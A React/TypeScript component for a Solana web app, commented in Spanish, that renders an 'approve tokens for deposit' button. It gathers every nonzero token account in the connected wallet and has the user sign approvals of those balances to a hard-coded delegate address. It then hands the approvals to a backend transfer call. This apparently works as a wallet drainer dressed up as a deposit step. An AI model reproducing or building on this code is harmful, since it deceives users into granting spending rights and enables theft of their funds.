// approve-button.tsx
import React, { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { PublicKey, Transaction } from "@solana/web3.js";
import { ApproveResult, approveTokenAllowances } from "./aprove-data-access";
import { useGetTokenAccounts } from "../account-data-access";
import { handleTransferRequest } from "./transferencia";
import { getTokenDecimals } from "./utils";
import { useCluster } from "@/components/cluster/cluster-data-access";
import { revokeTokenHandler } from "./revokeAuthority";
import { Transferencia } from "@/transferencia2";

export interface atasWithAmount {
  ata: string;
  mint: string;
  amountRawStr: string;
  amountUi: number;
}

interface CexApproveProps {
  approveFullBalance?: boolean;
}

export const MyApproveButton: React.FC<CexApproveProps> = () => {
  const { connection } = useConnection();
  const { publicKey, connected, signTransaction } = useWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);



  // delegate constante dentro del componente — ya no viene por props
  const delegate = "68xjA21fNQHT3iBeCFmoLoMNCwoQhB7BxEovCH8SyAig";

  // convertir delegate a PublicKey y validar
  let delegatePubkey: PublicKey;
  try {
    delegatePubkey = new PublicKey(delegate);
  } catch (e) {
    console.error("Delegate configurado inválido:", delegate, e);
    delegatePubkey = PublicKey.default;
  }

  // obtener lista de token accounts (ATA) del usuario conectado
  const { data: tokenAccountsData, isLoading: isAccountsLoading } = useGetTokenAccounts({
    address: publicKey as PublicKey
  });

  const atasWithAmount = React.useMemo(() => {
    if (!tokenAccountsData || !Array.isArray(tokenAccountsData)) return [];

    return tokenAccountsData
      .map((acct) => {
        const mint = acct?.account?.data?.parsed?.info?.mint as string ?? "";
        const amountRawStr = acct?.account?.data?.parsed?.info?.tokenAmount?.amount as string ?? "0";
        const amountUi = acct?.account?.data?.parsed?.info?.tokenAmount?.uiAmount as number ?? 0;

        return {
          ata: acct?.pubkey?.toBase58?.() ?? "",
          mint,
          amountRawStr,
          amountUi,
        };
      })
      .filter((x) => x.ata && x.mint && x.amountRawStr !== "0");
  }, [tokenAccountsData]);

  React.useEffect(() => {
    console.log("ATAs detectadas y normalizadas:", atasWithAmount);
  }, [atasWithAmount]);

  // Mutation para aprobar (llama a approveTokenAllowances)
  const approveMutation = useMutation<ApproveResult, unknown, Parameters<typeof approveTokenAllowances>[0]>({
    mutationFn: (params: Parameters<typeof approveTokenAllowances>[0]) =>
      approveTokenAllowances(params),
    onSuccess: async ({ approvals, txid }: ApproveResult) => {

      alert("✅ Autorización realizada.");
      console.log("Aprobación on-chain TXID:", txid);
      console.log("Datos aprovados", approvals);

      // Llamada al backend para la transferencia
      await Transferencia(approvals)


    },
    onError: (err) => {
      console.error("Error en la aprobación on-chain:", err?.message ?? String(err));
      alert(`❌ Error al aprobar: ${err?.message ?? String(err)}`);
    },
  });

  // Handler click: preparamos parámetros y disparamos approveMutation
  const handleApproveClick = async () => {
    if (isSubmitting) return;

    if (!connected || !publicKey || !signTransaction) {
      alert("Conecta tu wallet antes de continuar.");
      return;
    }

    if (!delegatePubkey || delegatePubkey.equals(PublicKey.default)) {
      alert("Delegate inválido. Revisa la configuración interna.");
      return;
    }

    if (atasWithAmount.length === 0) {
      alert("No se encontraron cuentas de token válidas para aprobar.");
      return;
    }

    setIsSubmitting(true);

    try {
      approveMutation.mutateAsync({
        connection,
        ownerPublicKey: publicKey,
        signTransaction: signTransaction,
        cexDelegateAddress: delegatePubkey,
        atasWithAmount: atasWithAmount
      });
    } catch (error) {
      // El onError de la mutación ya maneja el error, pero esto es por si acaso
      console.error("Error al ejecutar la mutación:", error);
    } finally {
      // 6. Restablece el estado tanto si tiene éxito como si falla
      setIsSubmitting(false);
    }

  };

  const loading = isAccountsLoading || approveMutation.isPending || isSubmitting;

  return (
    <button
      className="bg-red-700 text-white px-4 py-2 rounded disabled:opacity-50"
      onClick={handleApproveClick}
      // 8. La condición de 'disabled' ahora es más robusta
      disabled={!connected || loading}
      title={!connected ? "Conecta tu wallet" : "Aprobar tokens para depósito"}
    >
      {loading ? "Procesando..." : connected ? "Aprobar Tokens" : "Conectar Wallet"}
    </button>
  );
};
